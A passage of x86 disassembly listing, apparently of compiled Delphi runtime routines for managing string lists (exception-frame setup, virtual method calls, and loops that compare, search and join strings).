  407cc8:	8b c3                	mov    %ebx,%eax
  407cca:	8b 18                	mov    (%eax),%ebx
  407ccc:	ff 53 4c             	call   *0x4c(%ebx)
  407ccf:	8b c6                	mov    %esi,%eax
  407cd1:	5f                   	pop    %edi
  407cd2:	5e                   	pop    %esi
  407cd3:	5b                   	pop    %ebx
  407cd4:	c3                   	ret
  407cd5:	8d 40 00             	lea    0x0(%eax),%eax
  407cd8:	53                   	push   %ebx
  407cd9:	56                   	push   %esi
  407cda:	57                   	push   %edi
  407cdb:	8b f9                	mov    %ecx,%edi
  407cdd:	8b d8                	mov    %eax,%ebx
  407cdf:	8b c3                	mov    %ebx,%eax
  407ce1:	8b 08                	mov    (%eax),%ecx
  407ce3:	ff 51 2c             	call   *0x2c(%ecx)
  407ce6:	8b f0                	mov    %eax,%esi
  407ce8:	8b cf                	mov    %edi,%ecx
  407cea:	8b d6                	mov    %esi,%edx
  407cec:	8b c3                	mov    %ebx,%eax
  407cee:	8b 18                	mov    (%eax),%ebx
  407cf0:	ff 53 20             	call   *0x20(%ebx)
  407cf3:	8b c6                	mov    %esi,%eax
  407cf5:	5f                   	pop    %edi
  407cf6:	5e                   	pop    %esi
  407cf7:	5b                   	pop    %ebx
  407cf8:	c3                   	ret
  407cf9:	8d 40 00             	lea    0x0(%eax),%eax
  407cfc:	55                   	push   %ebp
  407cfd:	8b ec                	mov    %esp,%ebp
  407cff:	83 c4 f4             	add    $0xfffffff4,%esp
  407d02:	53                   	push   %ebx
  407d03:	56                   	push   %esi
  407d04:	57                   	push   %edi
  407d05:	33 c9                	xor    %ecx,%ecx
  407d07:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  407d0a:	89 55 f8             	mov    %edx,-0x8(%ebp)
  407d0d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407d10:	33 c0                	xor    %eax,%eax
  407d12:	55                   	push   %ebp
  407d13:	68 a3 7d 40 00       	push   $0x407da3
  407d18:	64 ff 30             	push   %fs:(%eax)
  407d1b:	64 89 20             	mov    %esp,%fs:(%eax)
  407d1e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407d21:	e8 fe 00 00 00       	call   0x407e24
  407d26:	33 c0                	xor    %eax,%eax
  407d28:	55                   	push   %ebp
  407d29:	68 86 7d 40 00       	push   $0x407d86
  407d2e:	64 ff 30             	push   %fs:(%eax)
  407d31:	64 89 20             	mov    %esp,%fs:(%eax)
  407d34:	8b 45 f8             	mov    -0x8(%ebp),%eax
  407d37:	8b 10                	mov    (%eax),%edx
  407d39:	ff 52 10             	call   *0x10(%edx)
  407d3c:	8b f0                	mov    %eax,%esi
  407d3e:	4e                   	dec    %esi
  407d3f:	85 f6                	test   %esi,%esi
  407d41:	7c 2d                	jl     0x407d70
  407d43:	46                   	inc    %esi
  407d44:	33 db                	xor    %ebx,%ebx
  407d46:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  407d49:	8b d3                	mov    %ebx,%edx
  407d4b:	8b 45 f8             	mov    -0x8(%ebp),%eax
  407d4e:	8b 38                	mov    (%eax),%edi
  407d50:	ff 57 0c             	call   *0xc(%edi)
  407d53:	8b 45 f4             	mov    -0xc(%ebp),%eax
  407d56:	50                   	push   %eax
  407d57:	8b d3                	mov    %ebx,%edx
  407d59:	8b 45 f8             	mov    -0x8(%ebp),%eax
  407d5c:	8b 08                	mov    (%eax),%ecx
  407d5e:	ff 51 14             	call   *0x14(%ecx)
  407d61:	8b c8                	mov    %eax,%ecx
  407d63:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407d66:	5a                   	pop    %edx
  407d67:	8b 38                	mov    (%eax),%edi
  407d69:	ff 57 30             	call   *0x30(%edi)
  407d6c:	43                   	inc    %ebx
  407d6d:	4e                   	dec    %esi
  407d6e:	75 d6                	jne    0x407d46
  407d70:	33 c0                	xor    %eax,%eax
  407d72:	5a                   	pop    %edx
  407d73:	59                   	pop    %ecx
  407d74:	59                   	pop    %ecx
  407d75:	64 89 10             	mov    %edx,%fs:(%eax)
  407d78:	68 8d 7d 40 00       	push   $0x407d8d
  407d7d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407d80:	e8 57 01 00 00       	call   0x407edc
  407d85:	c3                   	ret
  407d86:	e9 d5 af ff ff       	jmp    0x402d60
  407d8b:	eb f0                	jmp    0x407d7d
  407d8d:	33 c0                	xor    %eax,%eax
  407d8f:	5a                   	pop    %edx
  407d90:	59                   	pop    %ecx
  407d91:	59                   	pop    %ecx
  407d92:	64 89 10             	mov    %edx,%fs:(%eax)
  407d95:	68 aa 7d 40 00       	push   $0x407daa
  407d9a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  407d9d:	e8 3e b3 ff ff       	call   0x4030e0
  407da2:	c3                   	ret
  407da3:	e9 b8 af ff ff       	jmp    0x402d60
  407da8:	eb f0                	jmp    0x407d9a
  407daa:	5f                   	pop    %edi
  407dab:	5e                   	pop    %esi
  407dac:	5b                   	pop    %ebx
  407dad:	8b e5                	mov    %ebp,%esp
  407daf:	5d                   	pop    %ebp
  407db0:	c3                   	ret
  407db1:	8d 40 00             	lea    0x0(%eax),%eax
  407db4:	55                   	push   %ebp
  407db5:	8b ec                	mov    %esp,%ebp
  407db7:	51                   	push   %ecx
  407db8:	53                   	push   %ebx
  407db9:	8b da                	mov    %edx,%ebx
  407dbb:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407dbe:	8b c3                	mov    %ebx,%eax
  407dc0:	ba a8 77 40 00       	mov    $0x4077a8,%edx
  407dc5:	e8 4a ac ff ff       	call   0x402a14
  407dca:	84 c0                	test   %al,%al
  407dcc:	74 45                	je     0x407e13
  407dce:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407dd1:	e8 4e 00 00 00       	call   0x407e24
  407dd6:	33 c0                	xor    %eax,%eax
  407dd8:	55                   	push   %ebp
  407dd9:	68 0c 7e 40 00       	push   $0x407e0c
  407dde:	64 ff 30             	push   %fs:(%eax)
  407de1:	64 89 20             	mov    %esp,%fs:(%eax)
  407de4:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407de7:	8b 10                	mov    (%eax),%edx
  407de9:	ff 52 38             	call   *0x38(%edx)
  407dec:	8b d3                	mov    %ebx,%edx
  407dee:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407df1:	8b 08                	mov    (%eax),%ecx
  407df3:	ff 51 34             	call   *0x34(%ecx)
  407df6:	33 c0                	xor    %eax,%eax
  407df8:	5a                   	pop    %edx
  407df9:	59                   	pop    %ecx
  407dfa:	59                   	pop    %ecx
  407dfb:	64 89 10             	mov    %edx,%fs:(%eax)
  407dfe:	68 1d 7e 40 00       	push   $0x407e1d
  407e03:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407e06:	e8 d1 00 00 00       	call   0x407edc
  407e0b:	c3                   	ret
  407e0c:	e9 4f af ff ff       	jmp    0x402d60
  407e11:	eb f0                	jmp    0x407e03
  407e13:	8b d3                	mov    %ebx,%edx
  407e15:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407e18:	e8 a7 fd ff ff       	call   0x407bc4
  407e1d:	5b                   	pop    %ebx
  407e1e:	59                   	pop    %ecx
  407e1f:	5d                   	pop    %ebp
  407e20:	c3                   	ret
  407e21:	8d 40 00             	lea    0x0(%eax),%eax
  407e24:	53                   	push   %ebx
  407e25:	8b d8                	mov    %eax,%ebx
  407e27:	83 7b 04 00          	cmpl   $0x0,0x4(%ebx)
  407e2b:	75 09                	jne    0x407e36
  407e2d:	b2 01                	mov    $0x1,%dl
  407e2f:	8b c3                	mov    %ebx,%eax
  407e31:	8b 08                	mov    (%eax),%ecx
  407e33:	ff 51 28             	call   *0x28(%ecx)
  407e36:	ff 43 04             	incl   0x4(%ebx)
  407e39:	5b                   	pop    %ebx
  407e3a:	c3                   	ret
  407e3b:	90                   	nop
  407e3c:	55                   	push   %ebp
  407e3d:	8b ec                	mov    %esp,%ebp
  407e3f:	53                   	push   %ebx
  407e40:	56                   	push   %esi
  407e41:	8b 45 08             	mov    0x8(%ebp),%eax
  407e44:	8b 40 fc             	mov    -0x4(%eax),%eax
  407e47:	8b 70 1c             	mov    0x1c(%eax),%esi
  407e4a:	85 f6                	test   %esi,%esi
  407e4c:	74 2c                	je     0x407e7a
  407e4e:	b3 01                	mov    $0x1,%bl
  407e50:	8b 45 08             	mov    0x8(%ebp),%eax
  407e53:	8b c6                	mov    %esi,%eax
  407e55:	ba a8 77 40 00       	mov    $0x4077a8,%edx
  407e5a:	e8 b5 ab ff ff       	call   0x402a14
  407e5f:	84 c0                	test   %al,%al
  407e61:	74 27                	je     0x407e8a
  407e63:	8b 45 08             	mov    0x8(%ebp),%eax
  407e66:	8b d6                	mov    %esi,%edx
  407e68:	8b 45 08             	mov    0x8(%ebp),%eax
  407e6b:	8b 40 f8             	mov    -0x8(%eax),%eax
  407e6e:	e8 7d 00 00 00       	call   0x407ef0
  407e73:	8b d8                	mov    %eax,%ebx
  407e75:	80 f3 01             	xor    $0x1,%bl
  407e78:	eb 10                	jmp    0x407e8a
  407e7a:	8b 45 08             	mov    0x8(%ebp),%eax
  407e7d:	8b 40 f8             	mov    -0x8(%eax),%eax
  407e80:	8b 10                	mov    (%eax),%edx
  407e82:	ff 52 10             	call   *0x10(%edx)
  407e85:	85 c0                	test   %eax,%eax
  407e87:	0f 9f c3             	setg   %bl
  407e8a:	8b c3                	mov    %ebx,%eax
  407e8c:	5e                   	pop    %esi
  407e8d:	5b                   	pop    %ebx
  407e8e:	5d                   	pop    %ebp
  407e8f:	c3                   	ret
  407e90:	55                   	push   %ebp
  407e91:	8b ec                	mov    %esp,%ebp
  407e93:	83 c4 f8             	add    $0xfffffff8,%esp
  407e96:	53                   	push   %ebx
  407e97:	89 55 fc             	mov    %edx,-0x4(%ebp)
  407e9a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  407e9d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  407ea0:	50                   	push   %eax
  407ea1:	68 ec 83 40 00       	push   $0x4083ec
  407ea6:	8b 45 f8             	mov    -0x8(%ebp),%eax
  407ea9:	50                   	push   %eax
  407eaa:	68 38 86 40 00       	push   $0x408638
  407eaf:	55                   	push   %ebp
  407eb0:	e8 87 ff ff ff       	call   0x407e3c
  407eb5:	59                   	pop    %ecx
  407eb6:	8b c8                	mov    %eax,%ecx
  407eb8:	ba d4 7e 40 00       	mov    $0x407ed4,%edx
  407ebd:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407ec0:	8b 18                	mov    (%eax),%ebx
  407ec2:	ff 13                	call   *(%ebx)
  407ec4:	5b                   	pop    %ebx
  407ec5:	59                   	pop    %ecx
  407ec6:	59                   	pop    %ecx
  407ec7:	5d                   	pop    %ebp
  407ec8:	c3                   	ret
  407ec9:	00 00                	add    %al,(%eax)
  407ecb:	00 ff                	add    %bh,%bh
  407ecd:	ff                   	(bad)
  407ece:	ff                   	(bad)
  407ecf:	ff 07                	incl   (%edi)
  407ed1:	00 00                	add    %al,(%eax)
  407ed3:	00 53 74             	add    %dl,0x74(%ebx)
  407ed6:	72 69                	jb     0x407f41
  407ed8:	6e                   	outsb  %ds:(%esi),(%dx)
  407ed9:	67 73 00             	addr16 jae 0x407edc
  407edc:	ff 48 04             	decl   0x4(%eax)
  407edf:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  407ee3:	75 07                	jne    0x407eec
  407ee5:	33 d2                	xor    %edx,%edx
  407ee7:	8b 08                	mov    (%eax),%ecx
  407ee9:	ff 51 28             	call   *0x28(%ecx)
  407eec:	c3                   	ret
  407eed:	8d 40 00             	lea    0x0(%eax),%eax
  407ef0:	55                   	push   %ebp
  407ef1:	8b ec                	mov    %esp,%ebp
  407ef3:	83 c4 ec             	add    $0xffffffec,%esp
  407ef6:	53                   	push   %ebx
  407ef7:	56                   	push   %esi
  407ef8:	57                   	push   %edi
  407ef9:	33 c9                	xor    %ecx,%ecx
  407efb:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  407efe:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  407f01:	89 55 f8             	mov    %edx,-0x8(%ebp)
  407f04:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407f07:	33 c0                	xor    %eax,%eax
  407f09:	55                   	push   %ebp
  407f0a:	68 85 7f 40 00       	push   $0x407f85
  407f0f:	64 ff 30             	push   %fs:(%eax)
  407f12:	64 89 20             	mov    %esp,%fs:(%eax)
  407f15:	c6 45 f7 00          	movb   $0x0,-0x9(%ebp)
  407f19:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407f1c:	8b 10                	mov    (%eax),%edx
  407f1e:	ff 52 10             	call   *0x10(%edx)
  407f21:	8b d8                	mov    %eax,%ebx
  407f23:	8b 45 f8             	mov    -0x8(%ebp),%eax
  407f26:	8b 10                	mov    (%eax),%edx
  407f28:	ff 52 10             	call   *0x10(%edx)
  407f2b:	3b d8                	cmp    %eax,%ebx
  407f2d:	75 3b                	jne    0x407f6a
  407f2f:	8b f3                	mov    %ebx,%esi
  407f31:	4e                   	dec    %esi
  407f32:	85 f6                	test   %esi,%esi
  407f34:	7c 30                	jl     0x407f66
  407f36:	46                   	inc    %esi
  407f37:	33 db                	xor    %ebx,%ebx
  407f39:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407f3c:	8b d3                	mov    %ebx,%edx
  407f3e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407f41:	8b 38                	mov    (%eax),%edi
  407f43:	ff 57 0c             	call   *0xc(%edi)
  407f46:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407f49:	50                   	push   %eax
  407f4a:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  407f4d:	8b d3                	mov    %ebx,%edx
  407f4f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  407f52:	8b 38                	mov    (%eax),%edi
  407f54:	ff 57 0c             	call   *0xc(%edi)
  407f57:	8b 55 ec             	mov    -0x14(%ebp),%edx
  407f5a:	58                   	pop    %eax
  407f5b:	e8 90 b3 ff ff       	call   0x4032f0
  407f60:	75 08                	jne    0x407f6a
  407f62:	43                   	inc    %ebx
  407f63:	4e                   	dec    %esi
  407f64:	75 d3                	jne    0x407f39
  407f66:	c6 45 f7 01          	movb   $0x1,-0x9(%ebp)
  407f6a:	33 c0                	xor    %eax,%eax
  407f6c:	5a                   	pop    %edx
  407f6d:	59                   	pop    %ecx
  407f6e:	59                   	pop    %ecx
  407f6f:	64 89 10             	mov    %edx,%fs:(%eax)
  407f72:	68 8c 7f 40 00       	push   $0x407f8c
  407f77:	8d 45 ec             	lea    -0x14(%ebp),%eax
  407f7a:	ba 02 00 00 00       	mov    $0x2,%edx
  407f7f:	e8 7c b1 ff ff       	call   0x403100
  407f84:	c3                   	ret
  407f85:	e9 d6 ad ff ff       	jmp    0x402d60
  407f8a:	eb eb                	jmp    0x407f77
  407f8c:	8a 45 f7             	mov    -0x9(%ebp),%al
  407f8f:	5f                   	pop    %edi
  407f90:	5e                   	pop    %esi
  407f91:	5b                   	pop    %ebx
  407f92:	8b e5                	mov    %ebp,%esp
  407f94:	5d                   	pop    %ebp
  407f95:	c3                   	ret
  407f96:	8b c0                	mov    %eax,%eax
  407f98:	55                   	push   %ebp
  407f99:	8b ec                	mov    %esp,%ebp
  407f9b:	83 c4 f0             	add    $0xfffffff0,%esp
  407f9e:	53                   	push   %ebx
  407f9f:	56                   	push   %esi
  407fa0:	57                   	push   %edi
  407fa1:	33 db                	xor    %ebx,%ebx
  407fa3:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  407fa6:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  407fa9:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  407fac:	8b f2                	mov    %edx,%esi
  407fae:	8b d8                	mov    %eax,%ebx
  407fb0:	33 c0                	xor    %eax,%eax
  407fb2:	55                   	push   %ebp
  407fb3:	68 39 80 40 00       	push   $0x408039
  407fb8:	64 ff 30             	push   %fs:(%eax)
  407fbb:	64 89 20             	mov    %esp,%fs:(%eax)
  407fbe:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  407fc1:	8b d6                	mov    %esi,%edx
  407fc3:	8b c3                	mov    %ebx,%eax
  407fc5:	8b 38                	mov    (%eax),%edi
  407fc7:	ff 57 0c             	call   *0xc(%edi)
  407fca:	8b d6                	mov    %esi,%edx
  407fcc:	8b c3                	mov    %ebx,%eax
  407fce:	8b 08                	mov    (%eax),%ecx
  407fd0:	ff 51 14             	call   *0x14(%ecx)
  407fd3:	89 45 f8             	mov    %eax,-0x8(%ebp)
  407fd6:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407fd9:	8b 55 fc             	mov    -0x4(%ebp),%edx
  407fdc:	8b c3                	mov    %ebx,%eax
  407fde:	8b 38                	mov    (%eax),%edi
  407fe0:	ff 57 0c             	call   *0xc(%edi)
  407fe3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407fe6:	8b d6                	mov    %esi,%edx
  407fe8:	8b c3                	mov    %ebx,%eax
  407fea:	8b 38                	mov    (%eax),%edi
  407fec:	ff 57 1c             	call   *0x1c(%edi)
  407fef:	8b 55 fc             	mov    -0x4(%ebp),%edx
  407ff2:	8b c3                	mov    %ebx,%eax
  407ff4:	8b 08                	mov    (%eax),%ecx
  407ff6:	ff 51 14             	call   *0x14(%ecx)
  407ff9:	8b c8                	mov    %eax,%ecx
  407ffb:	8b d6                	mov    %esi,%edx
  407ffd:	8b c3                	mov    %ebx,%eax
  407fff:	8b 30                	mov    (%eax),%esi
  408001:	ff 56 20             	call   *0x20(%esi)
  408004:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  408007:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40800a:	8b c3                	mov    %ebx,%eax
  40800c:	8b 30                	mov    (%eax),%esi
  40800e:	ff 56 1c             	call   *0x1c(%esi)
  408011:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  408014:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408017:	8b c3                	mov    %ebx,%eax
  408019:	8b 18                	mov    (%eax),%ebx
  40801b:	ff 53 20             	call   *0x20(%ebx)
  40801e:	33 c0                	xor    %eax,%eax
  408020:	5a                   	pop    %edx
  408021:	59                   	pop    %ecx
  408022:	59                   	pop    %ecx
  408023:	64 89 10             	mov    %edx,%fs:(%eax)
  408026:	68 40 80 40 00       	push   $0x408040
  40802b:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40802e:	ba 02 00 00 00       	mov    $0x2,%edx
  408033:	e8 c8 b0 ff ff       	call   0x403100
  408038:	c3                   	ret
  408039:	e9 22 ad ff ff       	jmp    0x402d60
  40803e:	eb eb                	jmp    0x40802b
  408040:	5f                   	pop    %edi
  408041:	5e                   	pop    %esi
  408042:	5b                   	pop    %ebx
  408043:	8b e5                	mov    %ebp,%esp
  408045:	5d                   	pop    %ebp
  408046:	c3                   	ret
  408047:	90                   	nop
  408048:	33 c0                	xor    %eax,%eax
  40804a:	c3                   	ret
  40804b:	90                   	nop
  40804c:	55                   	push   %ebp
  40804d:	8b ec                	mov    %esp,%ebp
  40804f:	6a 00                	push   $0x0
  408051:	53                   	push   %ebx
  408052:	56                   	push   %esi
  408053:	57                   	push   %edi
  408054:	8b d8                	mov    %eax,%ebx
  408056:	33 c0                	xor    %eax,%eax
  408058:	55                   	push   %ebp
  408059:	68 93 80 40 00       	push   $0x408093
  40805e:	64 ff 30             	push   %fs:(%eax)
  408061:	64 89 20             	mov    %esp,%fs:(%eax)
  408064:	8d 55 fc             	lea    -0x4(%ebp),%edx
  408067:	8b c3                	mov    %ebx,%eax
  408069:	8b 08                	mov    (%eax),%ecx
  40806b:	ff 51 18             	call   *0x18(%ecx)
  40806e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408071:	e8 2e b3 ff ff       	call   0x4033a4
  408076:	e8 b9 d1 ff ff       	call   0x405234
  40807b:	8b d8                	mov    %eax,%ebx
  40807d:	33 c0                	xor    %eax,%eax
  40807f:	5a                   	pop    %edx
  408080:	59                   	pop    %ecx
  408081:	59                   	pop    %ecx
  408082:	64 89 10             	mov    %edx,%fs:(%eax)
  408085:	68 9a 80 40 00       	push   $0x40809a
  40808a:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40808d:	e8 4e b0 ff ff       	call   0x4030e0
  408092:	c3                   	ret
  408093:	e9 c8 ac ff ff       	jmp    0x402d60
  408098:	eb f0                	jmp    0x40808a
  40809a:	8b c3                	mov    %ebx,%eax
  40809c:	5f                   	pop    %edi
  40809d:	5e                   	pop    %esi
  40809e:	5b                   	pop    %ebx
  40809f:	59                   	pop    %ecx
  4080a0:	5d                   	pop    %ebp
  4080a1:	c3                   	ret
  4080a2:	8b c0                	mov    %eax,%eax
  4080a4:	55                   	push   %ebp
  4080a5:	8b ec                	mov    %esp,%ebp
  4080a7:	83 c4 e8             	add    $0xffffffe8,%esp
  4080aa:	53                   	push   %ebx
  4080ab:	56                   	push   %esi
  4080ac:	57                   	push   %edi
  4080ad:	33 c9                	xor    %ecx,%ecx
  4080af:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  4080b2:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  4080b5:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4080b8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4080bb:	33 c0                	xor    %eax,%eax
  4080bd:	55                   	push   %ebp
  4080be:	68 7b 81 40 00       	push   $0x40817b
  4080c3:	64 ff 30             	push   %fs:(%eax)
  4080c6:	64 89 20             	mov    %esp,%fs:(%eax)
  4080c9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4080cc:	8b 10                	mov    (%eax),%edx
  4080ce:	ff 52 10             	call   *0x10(%edx)
  4080d1:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4080d4:	33 db                	xor    %ebx,%ebx
  4080d6:	8b 75 f0             	mov    -0x10(%ebp),%esi
  4080d9:	4e                   	dec    %esi
  4080da:	85 f6                	test   %esi,%esi
  4080dc:	7c 29                	jl     0x408107
  4080de:	46                   	inc    %esi
  4080df:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  4080e6:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4080e9:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4080ec:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4080ef:	8b 38                	mov    (%eax),%edi
  4080f1:	ff 57 0c             	call   *0xc(%edi)
  4080f4:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4080f7:	e8 58 b1 ff ff       	call   0x403254
  4080fc:	83 c0 02             	add    $0x2,%eax
  4080ff:	03 d8                	add    %eax,%ebx
  408101:	ff 45 f4             	incl   -0xc(%ebp)
  408104:	4e                   	dec    %esi
  408105:	75 df                	jne    0x4080e6
  408107:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40810a:	8b cb                	mov    %ebx,%ecx
  40810c:	33 d2                	xor    %edx,%edx
  40810e:	e8 ad b0 ff ff       	call   0x4031c0
  408113:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  408116:	8b 1b                	mov    (%ebx),%ebx
  408118:	8b 75 f0             	mov    -0x10(%ebp),%esi
  40811b:	4e                   	dec    %esi
  40811c:	85 f6                	test   %esi,%esi
  40811e:	7c 40                	jl     0x408160
  408120:	46                   	inc    %esi
  408121:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  408128:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40812b:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40812e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408131:	8b 38                	mov    (%eax),%edi
  408133:	ff 57 0c             	call   *0xc(%edi)
  408136:	8b 45 ec             	mov    -0x14(%ebp),%eax
  408139:	e8 16 b1 ff ff       	call   0x403254
  40813e:	8b f8                	mov    %eax,%edi
  408140:	85 ff                	test   %edi,%edi
  408142:	74 0e                	je     0x408152
  408144:	8b d3                	mov    %ebx,%edx
  408146:	8b 45 ec             	mov    -0x14(%ebp),%eax
  408149:	8b cf                	mov    %edi,%ecx
  40814b:	e8 78 a5 ff ff       	call   0x4026c8
  408150:	03 df                	add    %edi,%ebx
  408152:	c6 03 0d             	movb   $0xd,(%ebx)
  408155:	43                   	inc    %ebx
  408156:	c6 03 0a             	movb   $0xa,(%ebx)
  408159:	43                   	inc    %ebx
  40815a:	ff 45 f4             	incl   -0xc(%ebp)
  40815d:	4e                   	dec    %esi
  40815e:	75 c8                	jne    0x408128
  408160:	33 c0                	xor    %eax,%eax
  408162:	5a                   	pop    %edx
  408163:	59                   	pop    %ecx
  408164:	59                   	pop    %ecx
  408165:	64 89 10             	mov    %edx,%fs:(%eax)
  408168:	68 82 81 40 00       	push   $0x408182
  40816d:	8d 45 e8             	lea    -0x18(%ebp),%eax
  408170:	ba 02 00 00 00       	mov    $0x2,%edx
  408175:	e8 86 af ff ff       	call   0x403100
  40817a:	c3                   	ret
  40817b:	e9 e0 ab ff ff       	jmp    0x402d60
  408180:	eb eb                	jmp    0x40816d
  408182:	5f                   	pop    %edi
  408183:	5e                   	pop    %esi
  408184:	5b                   	pop    %ebx
  408185:	8b e5                	mov    %ebp,%esp
  408187:	5d                   	pop    %ebp
  408188:	c3                   	ret
  408189:	8d 40 00             	lea    0x0(%eax),%eax
  40818c:	55                   	push   %ebp
  40818d:	8b ec                	mov    %esp,%ebp
  40818f:	83 c4 f4             	add    $0xfffffff4,%esp
  408192:	53                   	push   %ebx
  408193:	56                   	push   %esi
  408194:	57                   	push   %edi
  408195:	33 c9                	xor    %ecx,%ecx
  408197:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40819a:	89 55 f8             	mov    %edx,-0x8(%ebp)
  40819d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4081a0:	33 c0                	xor    %eax,%eax
  4081a2:	55                   	push   %ebp
  4081a3:	68 f9 81 40 00       	push   $0x4081f9
  4081a8:	64 ff 30             	push   %fs:(%eax)
  4081ab:	64 89 20             	mov    %esp,%fs:(%eax)
  4081ae:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4081b1:	8b 10                	mov    (%eax),%edx
  4081b3:	ff 52 10             	call   *0x10(%edx)
  4081b6:	8b d8                	mov    %eax,%ebx
  4081b8:	4b                   	dec    %ebx
  4081b9:	85 db                	test   %ebx,%ebx
  4081bb:	7c 23                	jl     0x4081e0
  4081bd:	43                   	inc    %ebx
  4081be:	33 f6                	xor    %esi,%esi
  4081c0:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4081c3:	8b d6                	mov    %esi,%edx
  4081c5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4081c8:	8b 38                	mov    (%eax),%edi
  4081ca:	ff 57 0c             	call   *0xc(%edi)
  4081cd:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4081d0:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4081d3:	e8 20 cb ff ff       	call   0x404cf8
  4081d8:	85 c0                	test   %eax,%eax
  4081da:	74 07                	je     0x4081e3
  4081dc:	46                   	inc    %esi
  4081dd:	4b                   	dec    %ebx
  4081de:	75 e0                	jne    0x4081c0
  4081e0:	83 ce ff             	or     $0xffffffff,%esi
  4081e3:	33 c0                	xor    %eax,%eax
  4081e5:	5a                   	pop    %edx
  4081e6:	59                   	pop    %ecx
  4081e7:	59                   	pop    %ecx
  4081e8:	64 89 10             	mov    %edx,%fs:(%eax)
  4081eb:	68 00 82 40 00       	push   $0x408200
  4081f0:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4081f3:	e8 e8 ae ff ff       	call   0x4030e0
  4081f8:	c3                   	ret
  4081f9:	e9 62 ab ff ff       	jmp    0x402d60
  4081fe:	eb f0                	jmp    0x4081f0
  408200:	8b c6                	mov    %esi,%eax
  408202:	5f                   	pop    %edi
  408203:	5e                   	pop    %esi
  408204:	5b                   	pop    %ebx
  408205:	8b e5                	mov    %ebp,%esp
  408207:	5d                   	pop    %ebp
  408208:	c3                   	ret
  408209:	8d 40 00             	lea    0x0(%eax),%eax
  40820c:	55                   	push   %ebp
  40820d:	8b ec                	mov    %esp,%ebp
  40820f:	51                   	push   %ecx
  408210:	53                   	push   %ebx
  408211:	56                   	push   %esi
  408212:	57                   	push   %edi
  408213:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  408216:	8b f2                	mov    %edx,%esi
  408218:	8b d8                	mov    %eax,%ebx
  40821a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40821d:	8b d6                	mov    %esi,%edx
  40821f:	8b c3                	mov    %ebx,%eax
  408221:	8b 38                	mov    (%eax),%edi
  408223:	ff 57 4c             	call   *0x4c(%edi)
  408226:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408229:	8b d6                	mov    %esi,%edx
  40822b:	8b c3                	mov    %ebx,%eax
  40822d:	8b 18                	mov    (%eax),%ebx
  40822f:	ff 53 20             	call   *0x20(%ebx)
  408232:	5f                   	pop    %edi
  408233:	5e                   	pop    %esi
  408234:	5b                   	pop    %ebx
  408235:	59                   	pop    %ecx
  408236:	5d                   	pop    %ebp
  408237:	c2 04 00             	ret    $0x4
  40823a:	8b c0                	mov    %eax,%eax
  40823c:	55                   	push   %ebp
  40823d:	8b ec                	mov    %esp,%ebp
  40823f:	51                   	push   %ecx
  408240:	53                   	push   %ebx
  408241:	8b d8                	mov    %eax,%ebx
  408243:	6a 00                	push   $0x0
  408245:	8b ca                	mov    %edx,%ecx
  408247:	b8 44 7a 40 00       	mov    $0x407a44,%eax
  40824c:	b2 01                	mov    $0x1,%dl
  40824e:	e8 11 0a 00 00       	call   0x408c64
  408253:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408256:	33 c0                	xor    %eax,%eax
